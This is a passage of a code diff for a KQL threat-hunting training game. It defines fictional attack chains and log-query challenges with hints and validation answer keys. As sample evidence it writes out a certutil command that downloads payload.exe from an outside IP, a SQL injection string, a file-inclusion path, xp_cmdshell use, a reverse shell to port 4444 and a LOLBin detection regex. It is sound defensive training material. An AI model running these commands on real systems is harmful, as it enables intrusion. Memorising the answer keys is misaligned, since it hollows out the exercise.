+        const CHAINS = {
+            1: {
+                name: "BEC + Credential Phishing", icon: "🎣", color: "#00d4ff", desc: "Token theft targeting j.hartley@meridianfg.internal from Kyiv, UA",
+                iocs: [{ type: "Malicious IP", val: "185.220.101.45" }, { type: "Target User", val: "j.hartley@meridianfg.internal" }, { type: "MFA Bypass", val: "Previously satisfied" }, { type: "Technique", val: "Token Theft → Email Forwarding" }]
+            },
+            2: {
+                name: "Living-off-the-Land + Ransomware", icon: "💀", color: "#ffb520", desc: "certutil download payload to WS-9991, encrypted files dropped",
+                iocs: [{ type: "Victim Host", val: "WS-9991" }, { type: "Victim User", val: "s.williams" }, { type: "C2 Server", val: "45.33.12.12" }, { type: "Payload", val: "C:\\Temp\\payload.exe" }]
+            },
+            3: {
+                name: "Insider Threat / Data Exfil", icon: "🕵️", color: "#a855f7", desc: "r.patel bulk-downloads HR files, stages to USB, beacons to mega.nz",
+                iocs: [{ type: "Insider", val: "r.patel@meridianfg.internal" }, { type: "Exfil Domain", val: "mega.nz" }, { type: "Staging File", val: "E:\\Exfil_Data.zip" }, { type: "Victim Site", val: "/sites/HR" }]
+            },
+            4: {
+                name: "Azure Misconfiguration Exploitation", icon: "☁️", color: "#00ff88", desc: "Compromised service principal harvests storage keys, creates backdoor account",
+                iocs: [{ type: "Service Principal", val: "sp-automation-99" }, { type: "Attacker IP", val: "185.220.100.1" }, { type: "Backdoor Account", val: "svc-backup-admin" }, { type: "Critical Action", val: "listKeys on Storage" }]
+            },
+            5: {
+                name: "Web Application Attack", icon: "🌐", color: "#ff2b5e", desc: "SQLi → LFI → xp_cmdshell → reverse shell from 203.0.113.50",
+                iocs: [{ type: "Attacker IP", val: "203.0.113.50" }, { type: "Targets", val: "web-iis-01, db-sql-01" }, { type: "SQLi Query", val: "id=1' OR '1'='1" }, { type: "Reverse Shell", val: "w3wp.exe → :4444" }]
+            },
+            6: {
+                name: "Advanced KQL Mastery", icon: "⭐", color: "#888", desc: "General KQL practice challenges — percentile, scan, partition, materialize, render, and more",
+                iocs: []
+            }
+        };
+
+        const ALL_COMMANDS = [
+            "search", "where", "project", "project-away", "project-rename", "extend", "distinct",
+            "summarize", "count()", "dcount()", "sum()", "avg()", "min()", "max()",
+            "sort/order by", "top", "take/limit", "let", "join inner", "join leftouter",
+            "join anti", "join semi", "join fullouter", "union", "parse", "parse_json()",
+            "mv-expand", "make_set()", "make_list()", "arg_max()", "arg_min()", "case()", "iff()",
+            "contains", "startswith", "endswith", "matches regex", "in", "between",
+            "bin()", "ago()", "datetime_diff()", "format_datetime()", "tostring()", "toint()", "todouble()",
+            "countif()", "dcountif()", "percentile()", "range()", "materialize()", "scan", "partition", "render"
+        ];
+
+        const CHALLENGES = [
+            // ── CHAIN 1: BEC ─────────────────────────────────────────────
+            {
+                id: 1, chain: 1, stage: "Initial Access", title: "Ghost in the Logs", difficulty: "Easy",
+                commands: ["search"],
+                tables: ["SigninLogs", "OfficeActivity", "AuditLogs"],
+                scenario: `Intel reports a suspicious IP address <strong>185.220.101.45</strong> originating from Kyiv, Ukraine. You need to quickly triage all log sources for any trace of this IP before scoping the incident.`,
+                task: `Use the <code>search</code> operator to find ALL records across SigninLogs, OfficeActivity, and AuditLogs that contain the string <strong>"185.220.101.45"</strong>. Report how many total records you find and which tables they appear in.`,
+                hint: `The <code>search</code> operator scans across all specified tables:<br><code>search in (SigninLogs, OfficeActivity, AuditLogs) "185.220.101.45"</code><br>Or just: <code>search "185.220.101.45"</code> to search everything.`,
+                validation: `User should find exactly 3 records total: 1 in SigninLogs (j.hartley login), 1 in OfficeActivity (MailItemsAccessed), 1 in AuditLogs (Set-Mailbox). The IP 185.220.101.45 must appear in results. If they found 3 rows with 185.220.101.45 across those tables, mark correct.`,
+                xp: 100
+            },
+
+            {
+                id: 2, chain: 1, stage: "Initial Access", title: "Pinpoint the Breach", difficulty: "Easy",
+                commands: ["where", "project"],
+                tables: ["SigninLogs"],
+                scenario: `You've confirmed the malicious IP. Now isolate the exact login event in SigninLogs to understand who was compromised and how the attacker bypassed MFA.`,
+                task: `Filter <strong>SigninLogs</strong> where <code>IPAddress == "185.220.101.45"</code>. Then project only: <code>TimeGenerated, UserPrincipalName, IPAddress, Location, MfaDetail, ResultType</code>. What was the MFA method used?`,
+                hint: `Chain <code>where</code> and <code>project</code>:<br><code>SigninLogs<br>| where IPAddress == "185.220.101.45"<br>| project TimeGenerated, UserPrincipalName, IPAddress, Location, MfaDetail, ResultType</code>`,
+                validation: `Result should show 1 row: UserPrincipalName=j.hartley@meridianfg.internal, IPAddress=185.220.101.45, MfaDetail showing 'Previously satisfied'. Location should show UA/Kyiv. If these values appear, mark correct.`,
+                xp: 120
+            },
+
+            {
+                id: 3, chain: 1, stage: "Initial Access", title: "Relabel the Evidence", difficulty: "Easy",
+                commands: ["project-rename", "extend"],
+                tables: ["SigninLogs"],
+                scenario: `Your SIEM team needs a standardized alert format. The column names need to be normalized, and you need to add a computed threat label for the SOC dashboard.`,
+                task: `From <strong>SigninLogs</strong> where IPAddress is <code>"185.220.101.45"</code>:<br>1. Use <code>project-rename</code> to rename <code>UserPrincipalName</code> → <code>Victim_UPN</code> and <code>IPAddress</code> → <code>Attacker_IP</code><br>2. Use <code>extend</code> to add <code>ThreatLabel = "BEC_TOKEN_THEFT"</code> and <code>AlertSeverity = "High"</code>`,
+                hint: `<code>SigninLogs<br>| where IPAddress == "185.220.101.45"<br>| project-rename Victim_UPN = UserPrincipalName, Attacker_IP = IPAddress<br>| extend ThreatLabel = "BEC_TOKEN_THEFT", AlertSeverity = "High"</code>`,
+                validation: `Result should have renamed columns Victim_UPN and Attacker_IP (not the originals), and new columns ThreatLabel='BEC_TOKEN_THEFT' and AlertSeverity='High'. The value j.hartley@meridianfg.internal in Victim_UPN column.`,
+                xp: 140
+            },
+
+            {
+                id: 4, chain: 1, stage: "Persistence", title: "Mailbox Backdoor Hunt", difficulty: "Medium",
+                commands: ["project-away", "parse_json()"],
+                tables: ["AuditLogs"],
+                scenario: `The attacker set a forwarding rule on the compromised mailbox. The <code>InitiatedBy</code> field in AuditLogs is stored as a JSON string. You need to extract the IP from inside it while stripping noisy columns.`,
+                task: `From <strong>AuditLogs</strong> where <code>OperationName == "Set-Mailbox"</code>:<br>1. Use <code>parse_json()</code> to extract <code>InitiatedBy.ipAddress</code> as <code>SourceIP</code> and <code>InitiatedBy.userPrincipalName</code> as <code>ActorUPN</code><br>2. Use <code>project-away</code> to remove <code>TenantId, CorrelationId, LoggedByService</code> from the output`,
+                hint: `<code>AuditLogs<br>| where OperationName == "Set-Mailbox"<br>| extend Initiator = parse_json(tostring(InitiatedBy))<br>| extend SourceIP = Initiator.ipAddress, ActorUPN = Initiator.userPrincipalName<br>| project-away TenantId, CorrelationId, LoggedByService</code>`,
+                validation: `Result should show 1 row with OperationName=Set-Mailbox, SourceIP=185.220.101.45, ActorUPN=j.hartley@meridianfg.internal. The three removed columns should NOT appear. Target field should show ForwardingSmtpAddress.`,
+                xp: 180
+            },
+
+            {
+                id: 5, chain: 1, stage: "Persistence", title: "Risk Classifier", difficulty: "Medium",
+                commands: ["case()", "iff()"],
+                tables: ["SigninLogs"],
+                scenario: `The SOC needs automated risk scoring. You must classify every login in SigninLogs based on location and MFA status using conditional logic.`,
+                task: `From <strong>SigninLogs</strong>, use <code>extend</code> with <code>case()</code> to create a <code>RiskScore</code> column:<br>• If IP is <code>"185.220.101.45"</code> → <code>"CRITICAL"</code><br>• If Location contains <code>"UA"</code> or <code>"RU"</code> → <code>"HIGH"</code><br>• Else → <code>"LOW"</code><br>Also use <code>iff()</code> to add <code>IsExternal = iff(not(IPAddress startswith "10."), true, false)</code>`,
+                hint: `<code>SigninLogs<br>| extend RiskScore = case(<br>    IPAddress == "185.220.101.45", "CRITICAL",<br>    tostring(Location) contains "UA" or tostring(Location) contains "RU", "HIGH",<br>    "LOW")<br>| extend IsExternal = iff(not(IPAddress startswith "10."), true, false)</code>`,
+                validation: `Results should include a RiskScore column with CRITICAL for the 185.220.101.45 row, and an IsExternal column (boolean). The row with j.hartley and 185.220.101.45 should show CRITICAL. Other external IPs should show HIGH or LOW.`,
+                xp: 180
+            },
+
+            // ── CHAIN 2: RANSOMWARE ─────────────────────────────────────
+            {
+                id: 6, chain: 2, stage: "Execution", title: "Macro Execution Detected", difficulty: "Easy",
+                commands: ["where", "contains", "startswith"],
+                tables: ["DeviceProcessEvents"],
+                scenario: `Word macro spawned a shell. You need to find the certutil download command on <strong>WS-9991</strong> before the payload fully executes.`,
+                task: `Query <strong>DeviceProcessEvents</strong> where:<br>• <code>DeviceName == "WS-9991"</code><br>• AND <code>ProcessCommandLine contains "certutil"</code> OR <code>ProcessCommandLine contains "urlcache"</code><br>• Project: <code>TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName</code>`,
+                hint: `<code>DeviceProcessEvents<br>| where DeviceName == "WS-9991"<br>| where ProcessCommandLine contains "certutil" or ProcessCommandLine contains "urlcache"<br>| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName</code>`,
+                validation: `Should return 1-2 rows from WS-9991. ProcessCommandLine must include certutil.exe -urlcache -split -f http://45.33.12.12/payload.exe. InitiatingProcessFileName should show cmd.exe or winword.exe.`,
+                xp: 120
+            },
+
+            {
+                id: 7, chain: 2, stage: "Execution", title: "Pattern Recognition — LOLBin Hunter", difficulty: "Medium",
+                commands: ["matches regex"],
+                tables: ["DeviceProcessEvents"],
+                scenario: `Threat intel says attackers use Living-off-the-Land binaries (LOLBins) — system tools like certutil, powershell, mshta, regsvr32, rundll32 — to evade AV. Hunt them all with a single regex.`,
+                task: `Query <strong>DeviceProcessEvents</strong> where <code>ProcessCommandLine matches regex</code> the pattern for common LOLBins. Use this regex: <code>@"(?i)(certutil|powershell|mshta|regsvr32|rundll32|wscript|cscript|bitsadmin)"</code>. Project DeviceName, FileName, ProcessCommandLine. How many LOLBin executions exist?`,
+                hint: `<code>DeviceProcessEvents<br>| where ProcessCommandLine matches regex @"(?i)(certutil|powershell|mshta|regsvr32|rundll32|wscript|cscript|bitsadmin)"<br>| project DeviceName, FileName, ProcessCommandLine, TimeGenerated<br>| summarize count() by FileName</code>`,
+                validation: `Should find at least 1-3 rows matching LOLBin commands. certutil.exe should appear from WS-9991. A summarize by FileName showing counts is ideal. certutil count should be at least 2.`,
+                xp: 160
+            },
+
+            {
+                id: 8, chain: 2, stage: "Persistence", title: "Registry Persistence Exposed", difficulty: "Easy",
+                commands: ["where", "endswith"],
+                tables: ["DeviceRegistryEvents"],
+                scenario: `The payload wrote itself to the HKCU Run key for persistence. Find the registry modification before it survives a reboot.`,
+                task: `Query <strong>DeviceRegistryEvents</strong> where:<br>• <code>RegistryKey endswith "Run"</code><br>• AND <code>RegistryValueName == "Updater"</code><br>Project all columns. What's the persistence path?`,
+                hint: `<code>DeviceRegistryEvents<br>| where RegistryKey endswith "Run"<br>| where RegistryValueName == "Updater"<br>| project DeviceName, RegistryKey, RegistryValueName, RegistryValueData, TimeGenerated</code>`,
+                validation: `Should return 1 row: DeviceName=WS-9991, RegistryKey containing CurrentVersion/Run, RegistryValueName=Updater, RegistryValueData=C:\Temp\payload.exe`,
+                xp: 120
+            },
+
+            {
+                id: 9, chain: 2, stage: "Execution", title: "Process Profiling", difficulty: "Medium",
+                commands: ["summarize", "count()", "sort/order by", "top"],
+                tables: ["DeviceProcessEvents"],
+                scenario: `Baseline normal process behavior before digging into anomalies. You need to identify the most active processes across all devices — high counts could indicate staging or automation.`,
+                task: `Summarize <strong>DeviceProcessEvents</strong> by <code>DeviceName</code> and <code>FileName</code>, counting events with <code>count()</code>. Then <code>sort</code> by count descending. Show only the <code>top 10</code>. Name the count column <code>ExecutionCount</code>.`,
+                hint: `<code>DeviceProcessEvents<br>| summarize ExecutionCount = count() by DeviceName, FileName<br>| sort by ExecutionCount desc<br>| top 10 by ExecutionCount</code>`,
+                validation: `Should show a summarized table with DeviceName, FileName, ExecutionCount columns. WS-9991 should appear with certutil.exe or cmd.exe entries. Top entries should have ExecutionCount values. Table should have at most 10 rows.`,
+                xp: 160
+            },
+
+            {
+                id: 10, chain: 2, stage: "C2 Communication", title: "Network Exfil Evidence", difficulty: "Medium",
+                commands: ["let", "join inner", "where"],
+                tables: ["DeviceProcessEvents", "DeviceNetworkEvents"],
+                scenario: `You need to correlate the certutil download with the subsequent C2 network connection — both happened on WS-9991 at the same timestamp. Confirm the link.`,
+                task: `Use <code>let</code> to create a variable <code>MaliciousDevice = "WS-9991"</code>. Then <code>join</code> (inner) <strong>DeviceProcessEvents</strong> with <strong>DeviceNetworkEvents</strong> on <code>DeviceName</code> where both tables have <code>DeviceName == MaliciousDevice</code>. Project: DeviceName, ProcessCommandLine, RemoteIP, RemotePort, BytesSent.`,
+                hint: `<code>let MaliciousDevice = "WS-9991";<br>DeviceProcessEvents<br>| where DeviceName == MaliciousDevice and ProcessCommandLine contains "certutil"<br>| join kind=inner (<br>    DeviceNetworkEvents | where DeviceName == MaliciousDevice<br>) on DeviceName<br>| project DeviceName, ProcessCommandLine, RemoteIP, RemotePort, BytesSent</code>`,
+                validation: `Should show rows where DeviceName=WS-9991, ProcessCommandLine contains certutil, RemoteIP=45.33.12.12, RemotePort=443, BytesSent=1500. The join connects process execution to network comms.`,
+                xp: 200
+            },
+
+            {
+                id: 11, chain: 2, stage: "Impact", title: "Ransomware Detonation Evidence", difficulty: "Medium",
+                commands: ["make_list()", "make_set()", "arg_max()"],
+                tables: ["DeviceFileEvents"],
+                scenario: `Files are being encrypted. You need to collect the full list of impacted files on WS-9991 and find the most recently encrypted file.`,
+                task: `From <strong>DeviceFileEvents</strong> where <code>DeviceName == "WS-9991"</code>:<br>1. Use <code>summarize</code> with <code>make_list(FileName)</code> to collect all filenames and <code>make_set(ActionType)</code> for unique action types<br>2. Also use <code>arg_max(TimeGenerated, FileName)</code> to find the latest file event`,
+                hint: `<code>DeviceFileEvents<br>| where DeviceName == "WS-9991"<br>| summarize AllFiles = make_list(FileName), UniqueActions = make_set(ActionType), LatestFile = arg_max(TimeGenerated, FileName)</code>`,
+                validation: `Result should show a summarized row with AllFiles as a list containing "important_docs.zip.encrypted", UniqueActions as a set, and LatestFile showing the most recent filename with its timestamp. important_docs.zip.encrypted must appear somewhere.`,
+                xp: 200
+            },
+
+            // ── CHAIN 3: INSIDER THREAT ──────────────────────────────────
+            {
+                id: 12, chain: 3, stage: "Collection", title: "Bulk Download Alert", difficulty: "Easy",
+                commands: ["where", "distinct", "take/limit"],
+                tables: ["OfficeActivity"],
+                scenario: `r.patel is accessing HR SharePoint at unusual hours. You need to quickly sample what files were downloaded.`,
+                task: `From <strong>OfficeActivity</strong> where <code>UserId contains "r.patel"</code> AND <code>Operation == "FileDownloaded"</code>:<br>1. Get <code>distinct</code> values of <code>SourceFileName</code><br>2. Use <code>take 10</code> to sample the first 10 results`,
+                hint: `<code>OfficeActivity<br>| where UserId contains "r.patel"<br>| where Operation == "FileDownloaded"<br>| distinct SourceFileName<br>| take 10</code>`,
+                validation: `Should show a list of distinct filenames downloaded by r.patel. Employee_Salaries.pdf should appear (or similar HR files). take 10 means at most 10 rows. Only SourceFileName column should appear.`,
+                xp: 120
+            },
+
+            {
+                id: 13, chain: 3, stage: "Collection", title: "User Download Stats", difficulty: "Medium",
+                commands: ["summarize", "dcount()", "avg()", "min()", "max()"],
+                tables: ["OfficeActivity"],
+                scenario: `Quantify r.patel's SharePoint activity across all sites versus other users to establish how anomalous the behavior is.`,
+                task: `Summarize <strong>OfficeActivity</strong> by <code>UserId</code> where <code>Operation == "FileDownloaded"</code>. For each user calculate: <code>TotalDownloads = count()</code>, <code>UniqueFiles = dcount(SourceFileName)</code>, <code>AvgFileSize = avg(todouble(FileSize))</code> if available — or just count. Sort by TotalDownloads desc.`,
+                hint: `<code>OfficeActivity<br>| where Operation == "FileDownloaded"<br>| summarize TotalDownloads = count(), UniqueFiles = dcount(SourceFileName) by UserId<br>| sort by TotalDownloads desc</code>`,
+                validation: `Should show a table grouped by UserId with TotalDownloads and UniqueFiles columns. r.patel should appear in the results. Data should be sorted descending by download count.`,
+                xp: 180
+            },
+
+            {
+                id: 14, chain: 3, stage: "Staging", title: "Exfil Staging Caught", difficulty: "Medium",
+                commands: ["where", "between", "bin()"],
+                tables: ["DeviceFileEvents", "DnsEvents"],
+                scenario: `r.patel created a zip file at the same time as a DNS lookup to mega.nz. Bucket the events by hour to confirm they're simultaneous.`,
+                task: `Query <strong>DeviceFileEvents</strong> where <code>FileName contains "Exfil"</code> OR <code>FileName contains "zip"</code>. Also query <strong>DnsEvents</strong> where <code>Name contains "mega"</code>. Filter both using <code>between</code> for dates <code>datetime(2026-04-25) .. datetime(2026-05-01)</code>. Use <code>bin(TimeGenerated, 1h)</code> to bucket by hour in the summarize.`,
+                hint: `<code>DeviceFileEvents<br>| where FileName contains "Exfil" or FileName contains "zip"<br>| where TimeGenerated between (datetime(2026-04-25) .. datetime(2026-05-01))<br>| summarize FileEvents = count() by bin(TimeGenerated, 1h), DeviceName<br><br>DnsEvents<br>| where Name contains "mega"<br>| where TimeGenerated between (datetime(2026-04-25) .. datetime(2026-05-01))</code>`,
+                validation: `DeviceFileEvents should show Exfil_Data.zip on WS-8882 in the April 28 timeframe. DnsEvents should show mega.nz lookup. Bins should be hourly. Both activities should cluster around the same hour.`,
+                xp: 200
+            },
+
+            {
+                id: 15, chain: 3, stage: "Exfiltration", title: "Multi-Source Hunt", difficulty: "Medium",
+                commands: ["union"],
+                tables: ["OfficeActivity", "AzureActivity", "DnsEvents"],
+                scenario: `Build a unified timeline of all suspicious activity by r.patel across SharePoint, Azure, and DNS to present as a coherent incident story.`,
+                task: `Use <code>union</code> to combine events from <strong>OfficeActivity</strong> (where UserId contains "r.patel" and Operation == "FileDownloaded"), <strong>AzureActivity</strong> (where Caller contains "r.patel"), and <strong>DnsEvents</strong> (where Name contains "mega"). Project a normalized view with <code>TimeGenerated, Source = "OfficeActivity"</code> (use extend), and relevant fields. Sort by TimeGenerated.`,
+                hint: `<code>let oa = OfficeActivity | where UserId contains "r.patel" and Operation == "FileDownloaded" | extend Source="Office365", Actor=UserId, Activity=Operation;<br>let az = AzureActivity | where Caller contains "r.patel" | extend Source="Azure", Actor=Caller, Activity=OperationName;<br>let dns = DnsEvents | where Name contains "mega" | extend Source="DNS", Actor=Computer, Activity=Name;<br>union oa, az, dns<br>| project TimeGenerated, Source, Actor, Activity<br>| sort by TimeGenerated asc</code>`,
+                validation: `Should show a unified timeline with 3+ rows from different sources. Source column should differentiate Office365, Azure, DNS. Activity from DNS should show mega.nz. Rows sorted by time. r.patel should appear in Actor column for OfficeActivity and AzureActivity rows.`,
+                xp: 220
+            },
+
+            {
+                id: 16, chain: 3, stage: "Exfiltration", title: "Unauthorized Secrets Access", difficulty: "Hard",
+                commands: ["join anti", "arg_min()"],
+                tables: ["AzureActivity", "SigninLogs"],
+                scenario: `r.patel tried to read Key Vault secrets but was blocked. You need to find AzureActivity callers who have NO corresponding successful sign-in — true rogue actors.`,
+                task: `Use <code>join kind=anti</code> to find callers in <strong>AzureActivity</strong> who do NOT appear as <code>UserPrincipalName</code> in <strong>SigninLogs</strong> (where ResultType == "0" = success). Also use <code>arg_min(TimeGenerated, *)</code> to get each caller's first suspicious action.`,
+                hint: `<code>AzureActivity<br>| where ActivityStatus == "Failed"<br>| summarize arg_min(TimeGenerated, *) by Caller<br>| join kind=anti (<br>    SigninLogs | where ResultType == "0" | project UserPrincipalName<br>) on $left.Caller == $right.UserPrincipalName</code>`,
+                validation: `Should show callers from AzureActivity (Failed) who have no successful signin match. r.patel's KeyVault failure or sp-automation-99 may appear. arg_min gives the earliest failed event per caller. At least 1 row should be returned.`,
+                xp: 260
+            },
+
+            // ── CHAIN 4: AZURE MISCONFIG ─────────────────────────────────
+            {
+                id: 17, chain: 4, stage: "Initial Access", title: "Service Principal Compromise", difficulty: "Medium",
+                commands: ["join leftouter", "where"],
+                tables: ["SigninLogs", "AuditLogs"],
+                scenario: `sp-automation-99 logged in from a suspicious IP and immediately created a backdoor account. Confirm the correlation by joining the signin to the subsequent audit event.`,
+                task: `Join <strong>SigninLogs</strong> (where UserPrincipalName contains "sp-automation-99") with <strong>AuditLogs</strong> (where OperationName == "Add user") using a <code>leftouter join</code> on matching <code>TimeGenerated</code> (round to minute using bin()). Project: IPAddress, UserPrincipalName, OperationName, TargetResources.`,
+                hint: `<code>let spLogin = SigninLogs | where UserPrincipalName contains "sp-automation-99" | extend TimeBin = bin(TimeGenerated, 5m);<br>let addUser = AuditLogs | where OperationName == "Add user" | extend TimeBin = bin(TimeGenerated, 5m);<br>spLogin<br>| join kind=leftouter addUser on TimeBin<br>| project IPAddress, UserPrincipalName, OperationName, TargetResources, TimeGenerated</code>`,
+                validation: `Should show sp-automation-99 login row with IPAddress=185.220.100.1 joined to "Add user" operation. TargetResources should show svc-backup-admin. If these fields appear in the result, mark correct.`,
+                xp: 220
+            },
+
+            {
+                id: 18, chain: 4, stage: "Persistence", title: "Backdoor Account Created", difficulty: "Medium",
+                commands: ["mv-expand", "parse_json()"],
+                tables: ["AuditLogs"],
+                scenario: `The TargetResources field in AuditLogs is a JSON array. Expand it to extract the backdoor account details in a readable format.`,
+                task: `From <strong>AuditLogs</strong> where <code>OperationName == "Add user"</code>:<br>1. Use <code>mv-expand</code> to expand the <code>TargetResources</code> array<br>2. Use <code>parse_json()</code> to extract <code>TargetResources.displayName</code> as <code>NewAccount</code> and <code>TargetResources.type</code> as <code>ResourceType</code>`,
+                hint: `<code>AuditLogs<br>| where OperationName == "Add user"<br>| mv-expand TargetResources<br>| extend NewAccount = parse_json(tostring(TargetResources)).displayName<br>| extend ResourceType = parse_json(tostring(TargetResources)).type<br>| project TimeGenerated, OperationName, NewAccount, ResourceType</code>`,
+                validation: `Should show NewAccount=svc-backup-admin and ResourceType=User (or similar). The mv-expand expands the array. OperationName should be "Add user". TimeGenerated should be around 2026-03-25.`,
+                xp: 220
+            },
+
+            {
+                id: 19, chain: 4, stage: "Impact", title: "Storage Key Harvest", difficulty: "Hard",
+                commands: ["join semi", "summarize", "make_set()"],
+                tables: ["AzureActivity", "SigninLogs"],
+                scenario: `Confirm which service principals performed BOTH a suspicious sign-in AND a critical storage key read — the intersection proves intent.`,
+                task: `Use <code>join kind=semi</code> to find callers in <strong>AzureActivity</strong> (where OperationName contains "listKeys") that ALSO exist in <strong>SigninLogs</strong> with a foreign IP. Then <code>summarize</code> with <code>make_set(OperationNameValue)</code> to list all operations they performed.`,
+                hint: `<code>AzureActivity<br>| where OperationNameValue contains "listKeys"<br>| join kind=semi (<br>    SigninLogs | where IPAddress startswith "185." | project UserPrincipalName<br>) on $left.Caller == $right.UserPrincipalName<br>| summarize Operations = make_set(OperationNameValue), Count = count() by Caller</code>`,
+                validation: `Should show sp-automation-99 as the Caller with listKeys in the Operations set. The semi join confirms both signin and storage access. Count should be at least 1. Caller=sp-automation-99@meridianfg.internal.`,
+                xp: 260
+            },
+
+            // ── CHAIN 5: WEB ATTACK ──────────────────────────────────────
+            {
+                id: 20, chain: 5, stage: "Initial Access", title: "SQLi Fingerprint", difficulty: "Easy",
+                commands: ["where", "in"],
+                tables: ["W3CIISLog"],
+                scenario: `The web server logs captured both a SQLi attempt and a successful LFI from the same attacker IP. Filter to see only traffic from known bad IPs.`,
+                task: `Filter <strong>W3CIISLog</strong> where <code>cIP in ("203.0.113.50", "185.220.101.45", "185.220.100.1", "45.33.12.12")</code>. Project: TimeGenerated, cIP, csUriStem, csUriQuery, scStatus, sComputerName. What HTTP status codes appeared?`,
+                hint: `<code>W3CIISLog<br>| where cIP in ("203.0.113.50", "185.220.101.45", "185.220.100.1", "45.33.12.12")<br>| project TimeGenerated, cIP, csUriStem, csUriQuery, scStatus, sComputerName<br>| sort by TimeGenerated asc</code>`,
+                validation: `Should return 2 rows from 203.0.113.50: one with status 500 (SQLi attempt: id=1' OR '1'='1) and one with status 200 (LFI success: file=../../../windows/win.ini). Both from web-iis-01 or similar. scStatus values 500 and 200 must appear.`,
+                xp: 120
+            },
+
+            {
+                id: 21, chain: 5, stage: "Initial Access", title: "Query String Forensics", difficulty: "Medium",
+                commands: ["parse", "extend", "tostring()"],
+                tables: ["W3CIISLog"],
+                scenario: `The csUriQuery field contains the raw query string. Parse it to extract the attack parameter name and value as separate fields for easier analysis.`,
+                task: `From <strong>W3CIISLog</strong> where <code>cIP == "203.0.113.50"</code>: Use <code>parse</code> to extract the key and value from csUriQuery with pattern <code>"*=*"</code>. Use <code>extend</code> and <code>tostring()</code> to create columns <code>QueryParam</code> and <code>QueryValue</code>. Also add <code>AttackType = iff(scStatus == 500, "SQLi Probe", "LFI Success")</code>`,
+                hint: `<code>W3CIISLog<br>| where cIP == "203.0.113.50"<br>| parse csUriQuery with QueryParam "=" QueryValue<br>| extend AttackType = iff(scStatus == 500, "SQLi Probe", "LFI Success")<br>| extend QueryParam = tostring(QueryParam), QueryValue = tostring(QueryValue)<br>| project TimeGenerated, QueryParam, QueryValue, AttackType, scStatus</code>`,
+                validation: `Should show 2 rows. Row 1: QueryParam=id, QueryValue=1' OR '1'='1, AttackType=SQLi Probe, scStatus=500. Row 2: QueryParam=file, QueryValue=../../../windows/win.ini, AttackType=LFI Success, scStatus=200.`,
+                xp: 200
+            },
+
+            {
+                id: 22, chain: 5, stage: "Execution", title: "DB Shell Execution", difficulty: "Medium",
+                commands: ["where", "contains", "join inner"],
+                tables: ["Syslog", "SecurityEvent"],
+                scenario: `xp_cmdshell was executed on db-sql-01, followed by sqlservr.exe spawning cmd.exe. Correlate both events to build the complete execution chain.`,
+                task: `Join <strong>Syslog</strong> (where SyslogMessage contains "xp_cmdshell" and HostName == "db-sql-01") with <strong>SecurityEvent</strong> (where EventID == 4688 and Computer == "db-sql-01" and ParentProcessName contains "sqlservr") using <code>inner join</code> on Computer/HostName. Project both events side by side.`,
+                hint: `<code>let xp = Syslog | where SyslogMessage contains "xp_cmdshell" and HostName == "db-sql-01";<br>let sec = SecurityEvent | where EventID == 4688 and Computer == "db-sql-01" and ParentProcessName contains "sqlservr";<br>xp<br>| join kind=inner sec on $left.HostName == $right.Computer<br>| project TimeGenerated, HostName, SyslogMessage, CommandLine, ParentProcessName</code>`,
+                validation: `Should show the join of Syslog xp_cmdshell event with SecurityEvent 4688. SyslogMessage should contain 'xp_cmdshell executed by user sqlexec'. CommandLine should contain 'cmd.exe /c ping 203.0.113.50'. ParentProcessName=sqlservr.exe.`,
+                xp: 220
+            },
+
+            {
+                id: 23, chain: 5, stage: "Lateral Movement", title: "Reverse Shell Firewall Blocked", difficulty: "Hard",
+                commands: ["join fullouter", "summarize", "count()"],
+                tables: ["DeviceNetworkEvents", "CommonSecurityLog"],
+                scenario: `w3wp.exe tried to establish a reverse shell to 203.0.113.50:4444. The firewall blocked subsequent attempts. Get the full picture with a full outer join.`,
+                task: `Use <code>join kind=fullouter</code> between <strong>DeviceNetworkEvents</strong> (RemoteIP == "203.0.113.50") and <strong>CommonSecurityLog</strong> (DestinationIP == "203.0.113.50"). After the join, summarize total <code>count()</code> of events by source and DeviceAction. Project the attacker IP, device, process, and firewall action.`,
+                hint: `<code>let endpoint = DeviceNetworkEvents | where RemoteIP == "203.0.113.50";<br>let firewall = CommonSecurityLog | where DestinationIP == "203.0.113.50";<br>endpoint<br>| join kind=fullouter firewall on $left.RemoteIP == $right.DestinationIP<br>| project TimeGenerated, DeviceName, InitiatingProcessFileName, RemoteIP, DeviceAction, DestinationPort<br>| summarize Events = count() by DeviceName, DeviceAction, InitiatingProcessFileName</code>`,
+                validation: `Should show both endpoint detection (w3wp.exe on web-iis-01 to 203.0.113.50:4444) and firewall block (DeviceAction=deny, DestinationPort=4444). Full outer join means both sides appear even without a match. w3wp.exe and deny must appear in results.`,
+                xp: 260
+            },
+
+            // ── ADVANCED KQL ────────────────────────────────────────────
+            {
+                id: 24, chain: 6, stage: "Advanced KQL", title: "Time Math — Attack Duration", difficulty: "Medium",
+                commands: ["datetime_diff()", "format_datetime()", "toint()", "todouble()"],
+                tables: ["SigninLogs"],
+                scenario: `Calculate how long the entire attack campaign lasted from first suspicious signin to last. Practice datetime arithmetic and type conversion.`,
+                task: `From <strong>SigninLogs</strong> where <code>IPAddress in ("185.220.101.45","185.220.100.1")</code>:<br>1. Find earliest and latest <code>TimeGenerated</code> using <code>min()</code> and <code>max()</code><br>2. Use <code>datetime_diff("day", max_time, min_time)</code> to get campaign duration in days<br>3. Use <code>format_datetime()</code> to format the start time as <code>'yyyy-MM-dd HH:mm'</code><br>4. Use <code>todouble()</code> to convert duration to a decimal`,
+                hint: `<code>SigninLogs<br>| where IPAddress in ("185.220.101.45","185.220.100.1")<br>| summarize FirstAttack = min(TimeGenerated), LastAttack = max(TimeGenerated)<br>| extend DurationDays = datetime_diff("day", LastAttack, FirstAttack)<br>| extend FirstAttackFormatted = format_datetime(FirstAttack, "yyyy-MM-dd HH:mm")<br>| extend DurationDouble = todouble(DurationDays)</code>`,
+                validation: `Should show FirstAttack around 2026-03-25, LastAttack around 2026-04-13, DurationDays showing the integer difference (about 19 days). FirstAttackFormatted should be a nicely formatted date string. DurationDouble should be a decimal version of the day count.`,
+                xp: 200
+            },
+
+            {
+                id: 25, chain: 6, stage: "Advanced KQL", title: "Conditional Aggregation", difficulty: "Hard",
+                commands: ["countif()", "dcountif()", "percentile()"],
+                tables: ["W3CIISLog"],
+                scenario: `Perform advanced statistical analysis on the IIS web server logs to understand both attack patterns and normal traffic baselines.`,
